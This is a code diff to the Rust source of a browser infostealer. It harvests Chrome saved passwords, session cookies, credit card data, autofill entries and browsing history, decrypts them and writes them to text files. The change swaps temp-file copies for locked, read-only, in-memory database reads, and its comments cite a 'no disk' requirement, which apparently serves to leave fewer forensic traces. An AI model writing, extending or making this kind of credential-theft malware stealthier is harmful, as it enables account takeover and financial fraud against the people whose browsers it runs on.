@@ -639,18 +639,25 @@ fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<
     None
 }
 
-fn copy_and_open_db(db_path: &Path) -> Option<(Connection, PathBuf)> {
-    let temp_db = std::env::temp_dir().join(format!("chrome_tmp_{}", rand::random::<u32>()));
-    if let Err(_) = fs::copy(db_path, &temp_db) {
-        return None;
-    }
-
-    match Connection::open(&temp_db) {
-        Ok(conn) => Some((conn, temp_db)),
-        Err(_) => {
-            let _ = fs::remove_file(&temp_db);
-            None
+fn open_db_in_memory(db_path: &Path) -> Option<Connection> {
+    let db_path_str = db_path.to_string_lossy();
+    // Use URI connection with nolock=1 to read locked databases without temporary files on disk
+    let uri = format!("file:{}?mode=ro&nolock=1", db_path_str);
+    match Connection::open_with_flags(&uri, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_URI) {
+        Ok(conn) => {
+            // Now backup the opened database to an in-memory one to fully satisfy the "no disk" and "all in memory" requirement for subsequent processing
+            match Connection::open_in_memory() {
+                Ok(mut mem_conn) => {
+                    {
+                        let backup = rusqlite::backup::Backup::new(&conn, &mut mem_conn).ok()?;
+                        backup.run_to_completion(5, std::time::Duration::from_millis(10), None).ok()?;
+                    }
+                    Some(mem_conn)
+                }
+                Err(_) => Some(conn), // Fallback to the read-only URI connection if backup fails
+            }
         }
+        Err(_) => None,
     }
 }
 
@@ -658,10 +665,17 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<
     let db_path = profile_path.join("Login Data");
     if !db_path.exists() { return; }
 
-    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+    if let Some(conn) = open_db_in_memory(&db_path) {
         if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
             let mut file = fs::File::create(output_dir.join("passwords.txt")).unwrap();
-            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?))).unwrap();
+            let rows = stmt.query_map([], |row| {
+                Ok((
+                    row.get::<_, String>(0)?,
+                    row.get::<_, String>(1)?,
+                    row.get::<_, Vec<u8>>(2)?,
+                ))
+            })
+            .unwrap();
 
             for row in rows.flatten() {
                 let (url, user, blob) = row;
@@ -670,7 +684,6 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<
                 }
             }
         }
-        let _ = fs::remove_file(temp_path);
     }
 }
 
@@ -681,10 +694,18 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&A
     }
     if !db_path.exists() { return; }
 
-    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+    if let Some(conn) = open_db_in_memory(&db_path) {
         if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, value, encrypted_value FROM cookies") {
             let mut file = fs::File::create(output_dir.join("cookies.txt")).unwrap();
-            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
+            let rows = stmt.query_map([], |row| {
+                Ok((
+                    row.get::<_, String>(0)?,
+                    row.get::<_, String>(1)?,
+                    row.get::<_, String>(2)?,
+                    row.get::<_, Vec<u8>>(3)?,
+                ))
+            })
+            .unwrap();
 
             for row in rows.flatten() {
                 let (host, name, value, blob) = row;
@@ -701,7 +722,6 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&A
                 }
             }
         }
-        let _ = fs::remove_file(temp_path);
     }
 }
 
@@ -709,7 +729,7 @@ fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&
     let db_path = profile_path.join("Web Data");
     if !db_path.exists() { return; }
 
-    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+    if let Some(conn) = open_db_in_memory(&db_path) {
         let mut file = fs::File::create(output_dir.join("autofill.txt")).unwrap();
 
         // Form History
@@ -733,7 +753,15 @@ fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&
 
         // Credit Cards
         if let Ok(mut stmt) = conn.prepare("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards") {
-            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, i32>(1)?, row.get::<_, i32>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
+            let rows = stmt.query_map([], |row| {
+                Ok((
+                    row.get::<_, String>(0)?,
+                    row.get::<_, i32>(1)?,
+                    row.get::<_, i32>(2)?,
+                    row.get::<_, Vec<u8>>(3)?,
+                ))
+            })
+            .unwrap();
             for row in rows.flatten() {
                 let (name, m, y, blob) = row;
                 if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
@@ -741,7 +769,6 @@ fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&
                 }
             }
         }
-        let _ = fs::remove_file(temp_path);
     }
 }
 
@@ -749,10 +776,18 @@ fn extract_history(profile_path: &Path, output_dir: &Path) {
     let db_path = profile_path.join("History");
     if !db_path.exists() { return; }
 
-    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+    if let Some(conn) = open_db_in_memory(&db_path) {
         if let Ok(mut stmt) = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100") {
             let mut file = fs::File::create(output_dir.join("history.txt")).unwrap();
-            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, i32>(2)?, row.get::<_, i64>(3)?))).unwrap();
+            let rows = stmt.query_map([], |row| {
+                Ok((
+                    row.get::<_, String>(0)?,
+                    row.get::<_, String>(1)?,
+                    row.get::<_, i32>(2)?,
+                    row.get::<_, i64>(3)?,
+                ))
+            })
+            .unwrap();
 
             for row in rows.flatten() {
                 let (url, title, count, _time) = row;
@@ -761,7 +796,6 @@ fn extract_history(profile_path: &Path, output_dir: &Path) {
                 writeln!(file, "URL: {} | Title: {} | Visits: {}", url, title, count).unwrap();
             }
         }
-        let _ = fs::remove_file(temp_path);
     }
 }
 
